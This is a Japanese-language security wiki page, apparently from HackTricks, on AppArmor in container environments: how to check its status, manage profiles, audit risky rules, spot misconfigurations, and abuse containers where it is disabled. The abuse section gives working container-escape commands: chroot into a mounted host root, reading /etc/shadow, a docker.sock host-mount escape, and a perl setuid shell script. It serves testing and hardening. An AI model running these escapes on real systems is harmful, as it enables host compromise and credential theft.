# AppArmor

{{#include ../../../../banners/hacktricks-training.md}}

## 概要

AppArmor は、プログラムごとのプロファイルを通じて制限を適用する**強制アクセス制御（Mandatory Access Control）**システムです。ユーザおよびグループの所有に大きく依存する従来の DAC チェックとは異なり、AppArmor はプロセス自体に紐づいたポリシーをカーネルが強制します。コンテナ環境では、ワークロードが従来の権限である程度の操作を試みられる場合でも、AppArmor プロファイルが該当のパス、マウント、ネットワーク動作、あるいは capability の使用を許可していなければ拒否されることがあるため、重要になります。

最も重要な概念的ポイントは、AppArmor が**パスベース**であるということです。SELinux がラベルで扱うのとは異なり、ファイルシステムへのアクセスはパスルールで判断します。これにより扱いやすく強力ですが、同時にバインドマウントや別のパス配置に注意が必要になります。同じホスト上の内容が別のパスから到達可能になった場合、ポリシーの効果が運用者の最初の想定と異なる可能性があります。

## コンテナ分離における役割

コンテナのセキュリティレビューはしばしば capabilities や seccomp で終わりますが、AppArmor はそれらのチェック後も重要です。コンテナが本来より多くの権限を持っている場合や、運用上の理由でワークロードがひとつ余分な capability を必要とした場合を想像してください。AppArmor は、それでもファイルアクセス、マウント動作、ネットワーキング、実行パターンを制限して、明らかな悪用経路を阻止できます。だからこそ、"アプリケーションを動かすためだけに" AppArmor を無効化すると、単にリスクのある設定が実際に悪用可能な状態へと密かに変わってしまうことがあるのです。

## ラボ

ホストで AppArmor が有効かどうかを確認するには、次を使用します:
```bash
aa-status 2>/dev/null || apparmor_status 2>/dev/null
cat /sys/module/apparmor/parameters/enabled 2>/dev/null
```
現在のコンテナプロセスがどのユーザー／コンテキストで実行されているかを確認するには：
```bash
docker run --rm ubuntu:24.04 cat /proc/self/attr/current
docker run --rm --security-opt apparmor=unconfined ubuntu:24.04 cat /proc/self/attr/current
```
この違いは示唆に富んでいる。通常の場合、プロセスはランタイムによって選択されたプロファイルに紐づくAppArmorコンテキストを示すはずだ。unconfinedの場合、その追加の制限レイヤーは消える。

Dockerが適用したと考えているものを確認することもできる:
```bash
docker inspect <container> | jq '.[0].AppArmorProfile'
```
## ランタイムでの使用

ホストが対応している場合、Docker はデフォルトまたはカスタムの AppArmor プロファイルを適用できます。Podman も AppArmor ベースのシステムで AppArmor と統合できますが、SELinux-first なディストリビューションでは別の MAC システムが優先されることが多いです。Kubernetes は、AppArmor を実際にサポートするノード上でワークロードレベルに AppArmor ポリシーを公開できます。LXC や関連する Ubuntu-family の system-container 環境でも AppArmor は広く使われています。

実務上のポイントは、AppArmor が「Docker の機能」ではないということです。これはホストカーネルの機能であり、複数のランタイムが適用を選択できるものです。ホストが対応していないか、ランタイムに run unconfined のように指示されている場合、想定される保護は実際には存在しません。

Kubernetes に関しては、モダンな API は `securityContext.appArmorProfile` です。Kubernetes `v1.30` 以降、古いベータ AppArmor 注釈は非推奨になりました。サポートされているホストでは、`RuntimeDefault` がデフォルトプロファイルで、`Localhost` はノード上で既にロードされている必要があるプロファイルを指します。これはレビュー時に重要で、マニフェスト上は AppArmor-aware に見えても、実際にはノード側のサポートと事前ロードされたプロファイルに完全に依存している可能性があるためです。

微妙だが有用な運用上の詳細は、`appArmorProfile.type: RuntimeDefault` を明示的に設定することが、単にフィールドを省略するより厳格であるという点です。フィールドを明示的に設定していてノードが AppArmor をサポートしていない場合、admission は失敗すべきです。フィールドを省略した場合、ワークロードは AppArmor のないノードで実行され続け、追加の拘束層を受けない可能性があります。攻撃者の観点では、これはマニフェストと実際のノード状態の両方を確認する良い理由になります。

Docker 対応の AppArmor ホストでは、最もよく知られたデフォルトは `docker-default` です。そのプロファイルは Moby の AppArmor テンプレートから生成され、なぜ一部の capability ベースの PoCs がデフォルトコンテナで失敗するのかを説明してくれるため重要です。大まかに言えば、`docker-default` は通常のネットワーキングを許可し、`/proc` の多くへの書き込みを拒否し、`/sys` の機密部分へのアクセスを拒否し、マウント操作をブロックし、ptrace を制限して一般的なホスト探索の手段にならないようにします。そのベースラインを理解することで、「コンテナが `CAP_SYS_ADMIN` を持っている」ことと「コンテナが実際に私が関心を持つカーネルインターフェースに対してその capability を利用できる」ことを区別できます。

## プロファイル管理

AppArmor プロファイルは通常 `/etc/apparmor.d/` 配下に保存されます。一般的な命名規則では、実行ファイルパス内のスラッシュをドットに置き換えます。例として、`/usr/bin/man` のプロファイルは通常 `/etc/apparmor.d/usr.bin.man` に保存されます。この詳細は、防御と評価の両方で重要です。アクティブなプロファイル名がわかれば、対応するファイルをホスト上で素早く見つけられることが多いためです。

役立つホスト側の管理コマンドには以下があります:
```bash
aa-status
aa-enforce
aa-complain
apparmor_parser
aa-genprof
aa-logprof
aa-mergeprof
```
これらのコマンドが container-security リファレンスで重要なのは、プロファイルが実際にどのように構築され、ロードされ、complain mode に切り替えられ、アプリケーションの変更後にどのように修正されるかを説明しているからです。オペレータがトラブルシューティング時にプロファイルを complain mode に移して enforcement を元に戻すのを忘れる癖があると、ドキュメント上ではコンテナが保護されているように見えても、実際にははるかに緩い動作になっている可能性があります。

### プロファイルの作成と更新

`aa-genprof` はアプリケーションの振る舞いを観察し、対話的にプロファイルを生成するのに役立ちます：
```bash
sudo aa-genprof /path/to/binary
/path/to/binary
```
`aa-easyprof` は、後で `apparmor_parser` で読み込めるテンプレートプロファイルを生成できます:
```bash
sudo aa-easyprof /path/to/binary
sudo apparmor_parser -a /etc/apparmor.d/path.to.binary
```
バイナリが変更されポリシーの更新が必要な場合、`aa-logprof` はログで検出された拒否を再生し、それらを許可するか拒否するかをオペレーターが判断する際に支援します:
```bash
sudo aa-logprof
```
### ログ

AppArmor の拒否は、`auditd`、syslog、または `aa-notify` のようなツールを通じて確認できることが多い:
```bash
sudo aa-notify -s 1 -v
```
これは運用面および攻撃面で有用です。防御側はプロファイルを洗練させるために利用します。攻撃者は、どの正確なパスや操作が拒否されているか、また AppArmor が exploit chain を遮断している制御であるかを把握するために利用します。

### 正確なプロファイルファイルの特定

runtime が container に対して特定の AppArmor プロファイル名を表示する場合、その名前をディスク上のプロファイルファイルに対応付けることがしばしば有用です:
```bash
docker inspect <container> | grep AppArmorProfile
find /etc/apparmor.d/ -maxdepth 1 -name '*<profile-name>*' 2>/dev/null
```
This is especially useful during host-side review because it bridges the gap between "the container says it is running under profile `lowpriv`" and "the actual rules live in this specific file that can be audited or reloaded".

### High-Signal Rules To Audit

プロファイルを読める場合、単純な `deny` 行で止まらないでください。いくつかのルール種別は、コンテナ脱出試行に対してAppArmorがどれほど有効かを実質的に変えます:

- `ux` / `Ux`: ターゲットバイナリを unconfined で実行します。到達可能な helper、shell、または interpreter が `ux` の下で許可されている場合、通常それが最初にテストする対象です。
- `px` / `Px` and `cx` / `Cx`: exec 時にプロファイル遷移を行います。これは自動的に悪いわけではありませんが、遷移先が現在よりもはるかに広いプロファイルになる可能性があるため、監査する価値があります。
- `change_profile`: タスクが別のロード済みプロファイルに切り替えることを許可します。即時であれ次回の exec 時であれ、遷移先のプロファイルが弱い場合、それが制限されたドメインからの脱出口になる可能性があります。
- `flags=(complain)`, `flags=(unconfined)`, or newer `flags=(prompt)`: これらはプロファイルにどれだけ信頼を置くかを変えます。`complain` は強制の代わりに denials をログに記録し、`unconfined` は境界を取り除き、`prompt` は純粋な kernel-enforced deny ではなく userspace の意思決定経路に依存します。
- `userns` or `userns create,`: 新しい AppArmor ポリシーは user namespaces の作成を仲介できます。コンテナのプロファイルが明示的にそれを許可している場合、プラットフォームが AppArmor をハードニング戦略の一部として使用していても、ネストされた user namespaces は有効なままです。

ホスト側で役に立つ grep:
```bash
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```
This kindのauditは、何百もの通常のファイルルールを眺めるよりも有用なことが多い。もしbreakoutがヘルパーの実行、新しい namespace への移行、あるいはより制約の緩い profile への脱出に依存しているなら、答えは明白な `deny /etc/shadow r` のような行ではなく、これらの遷移指向のルールに隠れていることが多い。

## Misconfigurations

もっとも明白なミスは `apparmor=unconfined` だ。管理者は、profile が正しく危険または予期しない動作をブロックしたために失敗したアプリケーションをデバッグする際にこれを設定することが多い。もしこのフラグが本番環境に残ると、実質的に MAC レイヤー全体が取り除かれたことになる。

もう一つの微妙な問題は、ファイル権限が通常に見えるからといって bind mounts が無害だと仮定することだ。AppArmor はパスベースなので、ホストのパスを別のマウント位置で露出させるとパスルールと悪く干渉する可能性がある。三つ目のミスは、ホストカーネルが実際に AppArmor を強制していない場合、設定ファイル中の profile 名はほとんど意味を持たないことを忘れることだ。

## Abuse

AppArmor が無効になると、以前は制限されていた操作が突然可能になることがある：bind mounts 経由で敏感なパスを読む、procfs や sysfs の本来利用しにくい部分にアクセスする、capabilities/seccomp が許す場合にマウント関連の操作を行う、あるいは通常 profile が拒否するようなパスを使うなどだ。AppArmor は、capability-based breakout 試行が理論上「動くはず」でも実際には失敗する理由を説明するメカニズムであることが多い。AppArmor を取り除くと、同じ試行が成功し始めるかもしれない。

もし AppArmor が path-traversal、bind-mount、またはマウントベースの悪用チェーンを止めている主因だと疑うなら、最初のステップは通常、profile あり・なしで何がアクセス可能になるかを比較することだ。たとえば、ホストのパスがコンテナ内にマウントされている場合は、まずそこを辿って読み取れるかどうかを確認することから始める：
```bash
cat /proc/self/attr/current
find /host -maxdepth 2 -ls 2>/dev/null | head
find /host/etc -maxdepth 1 -type f 2>/dev/null | head
```
コンテナが `CAP_SYS_ADMIN` のような危険な capability を持っている場合、最も実用的なテストのひとつは、mount 操作や機密性の高いカーネルファイルシステムへのアクセスをブロックしているのが AppArmor かどうかを確認することです:
```bash
capsh --print | grep cap_sys_admin
mount | head
mkdir -p /tmp/testmnt
mount -t proc proc /tmp/testmnt 2>/dev/null || echo "mount blocked"
mount -t tmpfs tmpfs /tmp/testmnt 2>/dev/null || echo "tmpfs blocked"
```
ホストパスが既に bind mount を通じて利用可能な環境では、AppArmor が無効になることで、read-only の information-disclosure issue が直接的なホストファイルアクセスに変わる場合もあります:
```bash
ls -la /host/root 2>/dev/null
cat /host/etc/shadow 2>/dev/null | head
find /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
```
これらのコマンドのポイントは、AppArmor 自体が単独で breakout を発生させるということではありません。AppArmor が削除されると、多くの filesystem や mount-based な abuse paths が即座にテスト可能になる、という点です。

### Full Example: AppArmor Disabled + Host Root Mounted

コンテナが既にホストのルートを `/host` に bind-mounted している場合、AppArmor を削除することで、ブロックされていた filesystem abuse path を完全な host escape に変えることができます:
```bash
cat /proc/self/attr/current
ls -la /host
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
shellがホストのファイルシステム経由で実行されるようになると、ワークロードは実質的にコンテナ境界から脱出したことになります:
```bash
id
hostname
cat /etc/shadow | head
```
### 完全な例: AppArmor Disabled + Runtime Socket

真の障壁がランタイム状態を囲む AppArmor だった場合、マウントされた socket だけで完全な脱出が可能になることがあります:
```bash
find /host/run /host/var/run -maxdepth 2 -name docker.sock 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
正確なパスはマウントポイントに依存しますが、結果は同じです: AppArmor はもはや runtime API へのアクセスを防げず、runtime API はホストを侵害する container を起動できます。

### Full Example: Path-Based Bind-Mount Bypass

AppArmor はパスベースで動作するため、`/proc/**` を保護しても、同じホストの procfs コンテンツが別のパス経由で参照可能な場合には自動的に保護されるわけではありません:
```bash
mount | grep '/host/proc'
find /host/proc/sys -maxdepth 3 -type f 2>/dev/null | head -n 20
cat /host/proc/sys/kernel/core_pattern 2>/dev/null
```
影響は何が正確にマウントされているか、代替パスが他の制御もbypassするかどうかによって異なるが、このパターンはAppArmorを単独で評価するのではなく、マウント構成と合わせて評価しなければならない最も明確な理由の一つである。

### 完全な例: Shebang Bypass

AppArmorのポリシーは、インタプリタのパスをターゲットにすることがあり、shebangによるスクリプト実行を完全に考慮していない場合がある。歴史的な例として、最初の行が制限されたインタプリタを指すスクリプトを使うものがあった:
```bash
cat <<'EOF' > /tmp/test.pl
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh";
EOF
chmod +x /tmp/test.pl
/tmp/test.pl
```
この種の例は、プロファイルの意図と実際の実行セマンティクスが乖離し得ることを思い出させる重要なものだ。コンテナ環境でAppArmorをレビューする際には、インタプリタのチェーンや別の実行経路に特に注意を払う必要がある。

## チェック

これらのチェックの目的は、次の3つの質問に素早く答えることだ：ホストでAppArmorが有効か、現在のプロセスが制限されているか、そしてランタイムが実際にこのコンテナにプロファイルを適用したかどうか。
```bash
cat /proc/self/attr/current                         # Current AppArmor label for this process
aa-status 2>/dev/null                              # Host-wide AppArmor status and loaded/enforced profiles
docker inspect <container> | jq '.[0].AppArmorProfile'   # Profile the runtime says it applied
find /etc/apparmor.d -maxdepth 1 -type f 2>/dev/null | head -n 50   # Host-side profile inventory when visible
cat /sys/kernel/security/apparmor/profiles 2>/dev/null | sort | head -n 50   # Loaded profiles straight from securityfs
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```
注目点:

- `/proc/self/attr/current` が `unconfined` を示している場合、そのワークロードは AppArmor の制約の恩恵を受けていません。
- `aa-status` が AppArmor が無効またはロードされていないことを示す場合、ランタイム設定のプロフィール名は大部分が見せかけにすぎません。
- `docker inspect` が `unconfined` または予期しないカスタムプロフィールを示している場合、ファイルシステムやマウントに基づく悪用経路が機能する主な原因であることが多いです。
- `/sys/kernel/security/apparmor/profiles` に期待したプロフィールが含まれていない場合、ランタイムやオーケストレータの設定だけでは不十分です。
- いわゆるハードニングされたプロフィールに `ux`、広範な `change_profile`、`userns`、または `flags=(complain)` のようなルールが含まれている場合、実際の境界はプロフィール名が示すよりもずっと弱い可能性があります。

運用上の理由でコンテナに既に特権が付与されている場合、AppArmor を有効にしたままにしておくことは、制御された例外とより広範なセキュリティ障害との違いを生むことが多いです。

## ランタイムのデフォルト

| Runtime / platform | デフォルトの状態 | デフォルトの動作 | 一般的な手動での弱体化 |
| --- | --- | --- | --- |
| Docker Engine | AppArmor 対応ホストではデフォルトで有効 | 上書きされない限り `docker-default` AppArmor profile を使用 | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Podman | ホスト依存 | `--security-opt` を通じて AppArmor をサポートするが、正確なデフォルトはホスト/ランタイム依存で、Docker の文書化された `docker-default` profile ほど普遍的ではない | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Kubernetes | 条件付きデフォルト | `appArmorProfile.type` が指定されていない場合、デフォルトは `RuntimeDefault` だが、ノードで AppArmor が有効なときにのみ適用される | `securityContext.appArmorProfile.type: Unconfined`, `securityContext.appArmorProfile.type: Localhost`（弱いプロフィール）や AppArmor 非対応ノード |
| containerd / CRI-O under Kubernetes | ノード/ランタイムのサポートに従う | 一般的な Kubernetes 対応のランタイムは AppArmor をサポートするが、実際の強制はノードのサポートとワークロード設定に依存する | Kubernetes の行と同じ; 直接のランタイム設定で AppArmor を完全にスキップすることもある |

AppArmor において最も重要な変数はしばしば **host** であり、ランタイムだけではありません。マニフェストのプロフィール設定は、AppArmor が有効になっていないノード上では制約を作成しません。

## References

- [Kubernetes security context: AppArmor profile fields and node-support behavior](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [Ubuntu 24.04 `apparmor.d(5)` manpage: exec transitions, `change_profile`, `userns`, and profile flags](https://manpages.ubuntu.com/manpages/noble/en/man5/apparmor.d.5.html)
{{#include ../../../../banners/hacktricks-training.md}}
